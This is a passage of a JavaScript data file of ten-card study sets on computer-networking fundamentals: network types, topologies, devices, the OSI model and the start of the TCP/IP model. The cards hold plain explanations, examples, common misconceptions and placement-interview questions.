/**
 * MASTER COMPUTER NETWORKS (CN) 10-CARD THEORY REPOSITORY
 * Exact 10 cards per topic across all 48 canonical topics (480 total cards)
 */

export const CN_TOPIC_CARDS = {
  "intro-to-networks": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Introduction to Computer Networks?",
      "inSimpleWords": "A computer network is an interconnected collection of autonomous computing devices (hosts, switches, routers) that exchange data and share resources over communication links.",
      "analogy": "Like a global highway system: vehicles (packets) carry passengers (data) from home driveways (source IP) across local streets (switches) and interstate ramps (routers).",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Introduction to Computer Networks?",
      "problem": "Isolated computers cannot share computational work, databases, or live communication without physical media transfer.",
      "whyItMatters": "Modern distributed computing, cloud storage, payment APIs, and real-time collaboration require millisecond-latency global resource exchange.",
      "howSolves": "Network communication protocols standardize packetization, addressing, routing, and error checking across heterogenous hardware vendors."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Introduction to Computer Networks work?",
      "steps": [
        {
          "step": 1,
          "title": "Host Creation",
          "desc": "Application generates byte stream and requests socket transmission via OS kernel."
        },
        {
          "step": 2,
          "title": "Packetization",
          "desc": "Data is segmented and wrapped in transport, network, and data link headers."
        },
        {
          "step": 3,
          "title": "Media Signaling",
          "desc": "NIC converts bits into electromagnetic radio waves or light pulses."
        },
        {
          "step": 4,
          "title": "Destination Delivery",
          "desc": "Destination NIC verifies checksum, decapsulates headers, and passes payload to target process."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Nodes": "End systems (Clients, Servers) and Intermediary devices (Switches, Routers)",
        "Links": "Twisted pair copper (Cat6), Optical fiber, Wireless radio (802.11)",
        "Protocols": "Standardized rules governing format, timing, sequencing, and error control",
        "Topology": "Physical layout and logical signal paths connecting all nodes"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A branch office in Bangalore needs to access inventory records stored on a cloud database in Virginia, USA.",
      "challenge": "Packets must traverse 14,000 km of undersea optical fiber cables across 15 router hops within 200 milliseconds.",
      "resolution": "Border Gateway Protocol (BGP) routes packets across Tier-1 ISPs, ensuring reliable transit with dynamic failover if an undersea cable is cut.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Local Host": "192.168.1.15",
        "Subnet Mask": "255.255.255.0",
        "Default Gateway": "192.168.1.1",
        "Target Cloud IP": "54.239.28.85 (AWS Virginia)",
        "Round Trip Time (RTT)": "184 ms"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Introduction to Computer Networks. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "The Internet is owned and run by a single central governing computer.",
          "why": "The Internet is a decentralized network of networks operated by autonomous ISPs.",
          "correct": "The Internet relies on peer routing protocols without any central bottleneck or single owner."
        },
        {
          "wrong": "Bandwidth is the speed at which bits travel along a wire.",
          "why": "Bits always travel at the speed of light in copper/fiber (~200,000 km/s).",
          "correct": "Bandwidth is the capacity (bits per second) transmitted simultaneously, not signal propagation speed."
        },
        {
          "wrong": "Packets in the same transmission always take the exact same physical path.",
          "why": "IP routing is packet-switched and dynamic.",
          "correct": "Different packets between the same host and server can take different router paths depending on congestion."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between Circuit Switching and Packet Switching?",
          "a": "Circuit switching reserves a dedicated physical end-to-end communication channel for the entire session duration (e.g. traditional landline telephone). Packet switching breaks data into discrete addressed packets that share communication links dynamically with other traffic (e.g. the Internet). Packet switching provides dramatically higher link utilization efficiency and resilience against link failures.",
          "tip": "Always mention statistical multiplexing when discussing packet switching advantages in placement interviews."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Networks exchange discrete packets across shared media using layered protocols.",
        "summaryPoints": [
          "End Systems (hosts) run user applications; Intermediary systems (routers/switches) forward packets.",
          "Packet switching dominates modern networks due to statistical multiplexing efficiency.",
          "Network latency = Transmission delay + Propagation delay + Queuing delay + Processing delay.",
          "Protocols define the syntax, semantics, and synchronization of network communication."
        ],
        "whenToUse": "Foundation for understanding all subsequent OSI and TCP/IP protocol layers."
      }
    }
  ],
  "network-types": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Types of Networks?",
      "inSimpleWords": "Networks are classified by their geographical span, administrative control, data transmission rates, and physical media into PAN, LAN, WLAN, MAN, and WAN.",
      "analogy": "PAN is your personal desk workspace; LAN is your office building; MAN is the city metro rail; WAN is the global international airline network.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Types of Networks?",
      "problem": "A single networking standard cannot cost-effectively span both a 2-meter Bluetooth headset connection and a 10,000-kilometer cross-continental internet link.",
      "whyItMatters": "Architects must select appropriate technologies: low-power PAN for wearables, high-throughput LAN for data centers, and redundant WAN for distributed offices.",
      "howSolves": "Different physical layer standards (802.15 WPAN, 802.3 Ethernet, 802.11 Wi-Fi, MPLS/SD-WAN) optimize bandwidth, power consumption, and distance."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Types of Networks work?",
      "steps": [
        {
          "step": 1,
          "title": "PAN (Personal Area)",
          "desc": "Range < 10 meters. Bluetooth, Zigbee, NFC connecting phones, watches, headphones."
        },
        {
          "step": 2,
          "title": "LAN (Local Area)",
          "desc": "Range < 1 km. High-speed Ethernet/Wi-Fi (1-100 Gbps) within a home, campus, or data center."
        },
        {
          "step": 3,
          "title": "MAN (Metropolitan)",
          "desc": "Range 5-50 km. Municipal fiber loops, cable TV networks connecting city branches."
        },
        {
          "step": 4,
          "title": "WAN (Wide Area)",
          "desc": "Global coverage. Interconnected routers spanning countries using leased lines and satellites."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "PAN": "Range: ~10 m | Speed: 1-24 Mbps | Media: 2.4 GHz RF (Bluetooth/NFC)",
        "LAN": "Range: ~1 km | Speed: 100 Mbps - 100 Gbps | Media: Cat6 Twisted Pair, Fiber",
        "MAN": "Range: ~50 km | Speed: 100 Mbps - 10 Gbps | Media: Dark Fiber, Metro Ethernet",
        "WAN": "Range: Global | Speed: 1.5 Mbps - 400 Gbps | Media: Undersea Fiber, Satellites"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A national retail bank connects 5,000 local branches across India to a central core banking database in Mumbai.",
      "challenge": "Local branches need high-speed connectivity for staff PCs, but WAN links over public internet can suffer jitter and downtime.",
      "resolution": "Each branch uses an internal Gigabit LAN, while interconnecting to the Mumbai headquarters via an encrypted SD-WAN mesh over redundant leased lines.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Branch LAN": "Gigabit Ethernet (1000BASE-T) inside branch",
        "Customer Wi-Fi": "WLAN (802.11ax Wi-Fi 6) on isolated VLAN",
        "City Interconnect": "Metro Ethernet MAN between regional hubs",
        "Core Banking WAN": "Multiprotocol Label Switching (MPLS) with 99.999% SLA"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Types of Networks (LAN, WAN, MAN, PAN, WLAN). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "WLAN is a separate higher-tier network type than LAN.",
          "why": "WLAN is simply the wireless transmission variant of a LAN (IEEE 802.11).",
          "correct": "WLAN operates within LAN geographical scale but uses radio frequency instead of copper cables."
        },
        {
          "wrong": "WANs always provide faster throughput than LANs because they are bigger.",
          "why": "Long physical distances introduce propagation delay and expensive link bandwidth.",
          "correct": "LANs offer drastically higher speeds (10-100 Gbps) and lower latency (<1 ms) compared to WANs."
        },
        {
          "wrong": "The Internet is the only existing WAN.",
          "why": "Private enterprise WANs connect private data centers without public internet transit.",
          "correct": "The Internet is the largest public WAN, but many private WANs exist worldwide."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Why is latency significantly lower on a LAN than on a WAN?",
          "a": "LAN latency is typically under 1 millisecond because physical cable runs are short (<100m for Cat6), media is dedicated with minimal queuing delay, and switching occurs at Layer 2 without routing table lookup overhead. WAN latency (40-200ms) is constrained by the speed of light over thousands of kilometers of fiber, serialization delays across lower-bandwidth pipes, and queuing delays through multiple transit routers.",
          "tip": "Highlight propagation delay (distance / speed of light) as the unbreakable physical barrier for WAN latency."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "PAN = Personal devices (<10m); LAN = Local building (<1km); WAN = Global inter-network.",
        "summaryPoints": [
          "LAN provides maximum bandwidth (1-100 Gbps) and lowest latency (<1 ms).",
          "WLAN replaces physical cables with 2.4 GHz and 5 GHz radio frequencies (802.11 standard).",
          "WAN connections require specialized edge routers and telecommunication carriers.",
          "SD-WAN dynamically steers traffic over multi-carrier WAN links based on real-time latency."
        ],
        "whenToUse": "Use when determining network boundaries, routing scopes, and link infrastructure budgets."
      }
    }
  ],
  "network-topologies": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Network Topologies?",
      "inSimpleWords": "A network topology defines how devices (nodes) and communication pathways (links) are physically wired and logically configured to route traffic.",
      "analogy": "Star is airport hubs where all planes route through a central city; Mesh is a web of direct flights between every pair of cities; Bus is a single train track where all stations attach to one line.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Network Topologies?",
      "problem": "Connecting 50 office computers haphazardly without an intentional topology causes wiring chaos, signal collisions, and single points of failure.",
      "whyItMatters": "Topology dictates cable costs, installation complexity, fault tolerance, and what happens when an individual link or device crashes.",
      "howSolves": "Standardized topologies balance cost vs redundancy: Star for enterprise LANs, Full Mesh for ISP backbones, Hybrid for campus infrastructures."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Network Topologies work?",
      "steps": [
        {
          "step": 1,
          "title": "Star Topology",
          "desc": "All nodes connect to a central switch. Link failure affects only that single node."
        },
        {
          "step": 2,
          "title": "Mesh Topology",
          "desc": "Every node connects to every other node: n*(n-1)/2 links. Maximum fault tolerance."
        },
        {
          "step": 3,
          "title": "Bus Topology",
          "desc": "All nodes share a single coaxial cable backbone with terminators at both ends."
        },
        {
          "step": 4,
          "title": "Ring Topology",
          "desc": "Nodes form a closed loop. Tokens circulate unidirectionally or bidirectionally."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Star Links": "n links for n devices | Central bottleneck: Switch",
        "Full Mesh Links": "n*(n - 1) / 2 physical links | Port count: (n - 1) per device",
        "Partial Mesh": "Redundant links between critical core routers only",
        "Hybrid": "Combination of Star networks interconnected by a Mesh or Tree backbone"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A nuclear power plant control system requires zero packet loss even if two fiber lines are accidentally severed by construction equipment.",
      "challenge": "A Star topology would fail completely if the central core switch suffered power failure or backplane lockup.",
      "resolution": "Deploy a Full Mesh topology across core controllers with Spanning Tree Protocol (STP) and dual redundant power supplies.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Star Nodes": "100 PCs connected to 48-port Cisco Catalyst switches",
        "Mesh Calculation": "For 6 core routers: 6*(5)/2 = 15 direct fiber links",
        "Bus Legacy": "10BASE2 Thinnet coaxial cable with 50-ohm BNC terminators",
        "Modern Standard": "Extended Star / Tree topology in all enterprise office buildings"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Network Topologies (Star, Mesh, Bus, Ring, Hybrid). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A Full Mesh topology is always the best choice for an office network.",
          "why": "Full Mesh for 500 computers would require 124,750 cable runs and 499 NIC ports per PC.",
          "correct": "Full Mesh is cost-prohibitive for end hosts; it is reserved for core ISP routers and mission-critical clusters."
        },
        {
          "wrong": "In a Star topology, if one host cable breaks, the whole network stops.",
          "why": "Only that specific broken link drops.",
          "correct": "The network only fails if the central switch fails, not if an individual host cable breaks."
        },
        {
          "wrong": "Physical topology is always identical to logical topology.",
          "why": "Token Ring physically looked like a star hub, but internally circulated a logical ring token.",
          "correct": "Physical topology is the physical cabling; logical topology is how signal data flows."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "How many physical links are needed for a Full Mesh network with 10 nodes?",
          "a": "The formula for a Full Mesh network is n*(n - 1) / 2. For 10 nodes: 10 * (10 - 1) / 2 = 10 * 9 / 2 = 45 physical duplex links. Each node must have (n - 1) = 9 dedicated network interfaces.",
          "tip": "Interviewers love asking the n(n-1)/2 formula and then following up with: 'What is the trade-off of Full Mesh vs Partial Mesh?'"
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Star = cheap & scalable (standard LAN); Full Mesh = maximum redundancy [n*(n-1)/2 links].",
        "summaryPoints": [
          "Star topology is universal in modern LANs due to cheap Cat6 cables and isolated port failures.",
          "Full Mesh provides zero single-point-of-failure at the cost of O(n^2) cable and port scaling.",
          "Bus topology suffers from electrical reflection if cable terminators are missing or damaged.",
          "Ring topology uses token passing to eliminate collisions (e.g. FDDI fiber rings)."
        ],
        "whenToUse": "Use when evaluating network availability requirements, disaster recovery, and infrastructure cabling."
      }
    }
  ],
  "network-devices": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Network Devices?",
      "inSimpleWords": "Network hardware devices operate at distinct layers of the OSI reference model to regenerate signals, direct local frames, route internet packets, or translate protocol suites.",
      "analogy": "Hub is a megaphone shouting to everyone in the room; Switch is a smart postman delivering letters directly to specific desk names; Router is an air traffic controller directing planes between different cities.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Network Devices?",
      "problem": "A simple copper wire cannot intelligently filter electrical noise, isolate traffic between departments, or connect an Ethernet LAN to an optical fiber internet provider.",
      "whyItMatters": "Placing a dumb L1 Hub in a modern 200-person office would flood all ports with every single packet, causing severe collisions, sluggish speeds, and security sniffing.",
      "howSolves": "Layer 2 Switches maintain MAC address tables for dedicated micro-segmentation; Layer 3 Routers use IP routing tables to segment broadcast domains."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Network Devices work?",
      "steps": [
        {
          "step": 1,
          "title": "Hub (Layer 1)",
          "desc": "Multiport repeater. Takes incoming bit from one port and regenerates it out to ALL other ports."
        },
        {
          "step": 2,
          "title": "Bridge (Layer 2)",
          "desc": "Connects two network segments. Inspects MAC addresses to filter or forward frames."
        },
        {
          "step": 3,
          "title": "Switch (Layer 2 / Layer 3)",
          "desc": "Multiport bridge. Uses CAM table to forward frames directly to target destination MAC."
        },
        {
          "step": 4,
          "title": "Router (Layer 3)",
          "desc": "Interconnects distinct IP subnets. Evaluates destination IP using routing table to forward packets."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Hub (L1)": "1 Collision Domain | 1 Broadcast Domain | Half Duplex | Floods all ports",
        "Switch (L2)": "N Collision Domains (1 per port) | 1 Broadcast Domain | Full Duplex | CAM Table",
        "Router (L3)": "N Collision Domains | N Broadcast Domains (Breaks broadcasts) | IP Routing Table",
        "Gateway": "Protocol converter operating across all layers (e.g. VoIP to PSTN gateway)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "An attacker plugs a Wireshark laptop into a wall port and attempts to capture coworker passwords transmitted across the floor.",
      "challenge": "If connected via a Hub, the attacker's NIC hears all electrical signals and reads all packets in cleartext.",
      "resolution": "A modern Layer 2 Switch forwards unicast frames strictly to the recipient's physical port based on its MAC table, preventing casual promiscuous sniffing.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Hub Flooding": "Frame from Port 1 copied blindly to Ports 2, 3, 4, 5",
        "Switch Forwarding": "Frame for MAC 3C:52:... forwarded ONLY out of Port 3",
        "Router Subnet Transit": "Subnet 192.168.1.0/24 routed to Subnet 10.0.0.0/8 via interface GigabitEthernet0/1",
        "Default Gateway": "192.168.1.1 on internal router interface"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Network Devices (Hub, Switch, Router, Gateway, Bridge). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A switch breaks up broadcast domains.",
          "why": "Switches forward all broadcast frames (FF:FF:FF:FF:FF:FF) out of all active ports.",
          "correct": "A switch breaks collision domains; a ROUTER breaks broadcast domains."
        },
        {
          "wrong": "A router forwards traffic based on MAC address.",
          "why": "Routers strip the L2 MAC header and inspect the L3 destination IP address.",
          "correct": "Switches forward by MAC address; Routers forward by IP address."
        },
        {
          "wrong": "A Gateway is just another word for a router.",
          "why": "While a router can be a default gateway, true gateways perform protocol translation between incompatible systems.",
          "correct": "A router interconnects IP subnets; a Gateway translates between different architectures."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between a Hub, a Switch, and a Router in terms of collision and broadcast domains?",
          "a": "A Hub has 1 single collision domain and 1 broadcast domain across all ports. A Switch provides a dedicated collision domain for each individual port, but shares 1 single broadcast domain across all ports (unless partitioned by VLANs). A Router provides both separate collision domains per interface AND breaks broadcast domains, meaning broadcasts are not forwarded across router interfaces.",
          "tip": "Memorize: 'Switches break collision domains; Routers break broadcast domains.' This is asked in virtually every MNC fresher interview."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Hub = L1 repeater; Switch = L2 MAC forwarder; Router = L3 IP boundary.",
        "summaryPoints": [
          "Hub operates at Physical Layer (L1); floods all frames blindly; half-duplex only.",
          "Switch operates at Data Link Layer (L2); learns MAC addresses in CAM table; full-duplex.",
          "Router operates at Network Layer (L3); inspects IP headers; connects different subnets.",
          "Layer 3 switches combine switch wire-speed ASICs with router IP routing capability."
        ],
        "whenToUse": "Essential for architecting enterprise topologies and answering placement networking questions."
      }
    }
  ],
  "osi-model": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is OSI 7-Layer Reference Model?",
      "inSimpleWords": "The Open Systems Interconnection (OSI) reference model is an ISO conceptual framework dividing computer network communication into 7 distinct abstraction layers.",
      "analogy": "Sending an international parcel: 7. You write letter; 6. Translator translates language; 5. Secretary confirms recipient availability; 4. Courier stamps tracking number; 3. Postal sorting maps city route; 2. Local van delivers to street box; 1. Wheels roll on asphalt road.",
      "diagramType": "osi-model"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need OSI 7-Layer Reference Model?",
      "problem": "In the 1970s, proprietary networking vendors (IBM SNA, DECnet) produced hardware that could not talk to each other, creating vendor lock-in.",
      "whyItMatters": "The 7-layer hierarchy standardizes interfaces so an application developer can write web code without caring whether the client connects via Wi-Fi, Ethernet, or 5G fiber.",
      "howSolves": "Each layer provides a specific service to the layer above it, abstracting the complexities of the underlying layers through standardized Protocol Data Units (PDUs)."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does OSI 7-Layer Reference Model work?",
      "steps": [
        {
          "step": 1,
          "title": "Physical (L1) - Bits",
          "desc": "Voltage levels, bit timing, fiber optic light pulses, cables (RJ45, Cat6)."
        },
        {
          "step": 2,
          "title": "Data Link (L2) - Frames",
          "desc": "Node-to-node hop delivery, 48-bit MAC addresses, error detection (CRC)."
        },
        {
          "step": 3,
          "title": "Network (L3) - Packets",
          "desc": "End-to-end routing across networks, logical IPv4/IPv6 addressing."
        },
        {
          "step": 4,
          "title": "Transport (L4) - Segments",
          "desc": "Process-to-process delivery, port numbers, reliability (TCP) or speed (UDP)."
        },
        {
          "step": 5,
          "title": "Session (L5) - Data",
          "desc": "Establishes, manages, and terminates multi-stream communication sessions (RPC, Sockets)."
        },
        {
          "step": 6,
          "title": "Presentation (L6) - Data",
          "desc": "Data translation, syntax, compression (gzip), and encryption (SSL/TLS, ASCII)."
        },
        {
          "step": 7,
          "title": "Application (L7) - Data",
          "desc": "Direct user interface protocols (HTTP, DNS, SMTP, FTP, SSH)."
        }
      ],
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Layer 7 (Application)": "HTTP, HTTPS, DNS, DHCP, SMTP, FTP, SSH",
        "Layer 6 (Presentation)": "SSL/TLS, ASCII, EBCDIC, JPEG, MPEG, Data Compression",
        "Layer 5 (Session)": "NetBIOS, RPC, PPTP, Sockets Session Management",
        "Layer 4 (Transport)": "TCP, UDP, SCTP (Ports 0 - 65535)",
        "Layer 3 (Network)": "IPv4, IPv6, ICMP, IPsec, IGMP, Routing",
        "Layer 2 (Data Link)": "Ethernet, Wi-Fi 802.11, ARP, PPP, Switches",
        "Layer 1 (Physical)": "Copper Cat6, Fiber optics, Radio RF, Hubs, Repeaters"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A student types https://google.com into their laptop and hits Enter.",
      "challenge": "How do abstract application concepts (URL string) convert into microscopic optical pulses in undersea glass cables?",
      "resolution": "Data cascades down the 7 OSI layers, gaining protocol headers at each step, and is unwrapped in reverse order by Google's servers.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "PDU Mnemonic": "Please Do Not Throw Sausage Pizza Away (Physical -> Application)",
        "Top-Down Mnemonic": "All People Seem To Need Data Processing (Application -> Physical)",
        "L4 Protocol Data Unit": "Segment (TCP) / Datagram (UDP)",
        "L3 Protocol Data Unit": "Packet",
        "L2 Protocol Data Unit": "Frame",
        "L1 Protocol Data Unit": "Bits"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for OSI 7-Layer Reference Model. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "The OSI model is the physical protocol stack currently running the Internet.",
          "why": "The modern Internet runs on the 4-layer TCP/IP protocol suite, not the 7-layer OSI model.",
          "correct": "OSI is a conceptual reference model; TCP/IP is the practical implementation."
        },
        {
          "wrong": "Routers operate at all 7 layers of the OSI model.",
          "why": "Standard IP routers only inspect headers up to Layer 3 (Network).",
          "correct": "Standard routers operate at Layer 3; Layer 2 switches operate at Layer 2; only end hosts inspect all 7 layers."
        },
        {
          "wrong": "Encryption only occurs at Layer 7.",
          "why": "IPsec encrypts at Layer 3; MACsec encrypts at Layer 2; TLS operates at Layer 6/7.",
          "correct": "Encryption can be implemented at Layer 2, Layer 3, or Layer 6/7 depending on security architecture."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Name the 7 layers of the OSI model from bottom to top, their corresponding Protocol Data Units (PDUs), and one protocol for each.",
          "a": "1. Physical (Bits, 802.3u); 2. Data Link (Frames, Ethernet/ARP); 3. Network (Packets, IPv4/ICMP); 4. Transport (Segments, TCP/UDP); 5. Session (Data, RPC/NetBIOS); 6. Presentation (Data, TLS/ASCII); 7. Application (Data, HTTP/DNS).",
          "tip": "Always specify the exact PDU names: Bits -> Frames -> Packets -> Segments -> Data."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Physical (Bits) -> Data Link (Frames) -> Network (Packets) -> Transport (Segments) -> Session -> Presentation -> Application (Data).",
        "summaryPoints": [
          "Layers 1-4 are Media/Transport layers; Layers 5-7 are Application/Software layers.",
          "Encapsulation occurs top-to-bottom on sender; Decapsulation occurs bottom-to-top on receiver.",
          "Switches inspect L2 MAC headers; Routers inspect L3 IP headers; Firewalls inspect L4-L7 headers.",
          "PDU names: Bits (L1) -> Frames (L2) -> Packets (L3) -> Segments (L4) -> Data (L5-L7)."
        ],
        "whenToUse": "The universal reference model used to diagnose, troubleshoot, and explain all networking protocols."
      }
    }
  ],
  "tcp-ip-model": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TCP/IP 4-Layer Architecture?",
      "inSimpleWords": "The TCP/IP model (Department of Defense DoD model) is the practical 4-layer protocol stack that actually implements and powers the global Internet.",
      "analogy": "If OSI is the idealistic theoretical blueprint for a house, TCP/IP is the actual brick-and-mortar building that everyone lives in.",
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TCP/IP 4-Layer Architecture?",
      "problem": "The 7-layer OSI model had rigid session and presentation layers that introduced unnecessary complexity and processing overhead in operating system kernels.",
      "whyItMatters": "Every modern computer, smartphone, Linux kernel, and cloud server runs the TCP/IP stack natively in software.",
      "howSolves": "Combines application, presentation, and session into one Application layer; retains pure Network Interface, Internet, and Transport layers."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does TCP/IP 4-Layer Architecture work?",
      "steps": [
        {
          "step": 1,
          "title": "Application Layer",
          "desc": "HTTP, DNS, SSH, TLS handled directly by user space processes and libraries."
        },
        {
          "step": 2,
          "title": "Transport Layer",
          "desc": "TCP (reliable stream) and UDP (unreliable datagram) managed by OS kernel sockets."
        },
        {
          "step": 3,
          "title": "Internet Layer",
          "desc": "IP (IPv4/IPv6), ICMP, and routing algorithms providing universal best-effort packet delivery."
        },
        {
          "step": 4,
          "title": "Network Interface Layer",
          "desc": "Ethernet, Wi-Fi, MAC hardware drivers binding OS packets to physical transmission media."
        }
      ],
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Application (L4)": "HTTP, HTTPS, DNS, DHCP, SMTP, SSH, FTP, WebSocket",
        "Transport (L3)": "TCP (Transmission Control Protocol) & UDP (User Datagram Protocol)",
        "Internet (L2)": "IPv4, IPv6, ICMP, ARP (inter-layer), IPsec",
        "Network Interface (L1)": "Ethernet (802.3), Wi-Fi (802.11), PPP, Fiber (SONET)"
      },
      "diagramType": "tcp-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A Linux developer builds a Node.js microservice communicating with Redis and PostgreSQL.",
      "challenge": "The developer only wants to write application business logic without managing packet loss, bit flips, or optical transceivers.",
      "resolution": "The developer opens standard POSIX TCP sockets: the TCP/IP kernel stack handles retransmission, sliding window flow control, and IP routing automatically.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Socket Call": "connect(sockfd, {192.168.1.100, port: 5432})",
        "Kernel Transport": "Wraps payload in 20-byte TCP segment header",
        "Kernel Internet": "Wraps segment in 20-byte IPv4 packet header",
        "NIC Driver": "Pushes 1518-byte Ethernet frame to hardware ring buffer"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for TCP/IP 4-Layer Architecture. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "encapsulation"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "TCP/IP has 5 layers officially.",
          "why": "The original RFC 1122 specification defines exactly 4 layers (Network Interface, Internet, Transport, Application).",
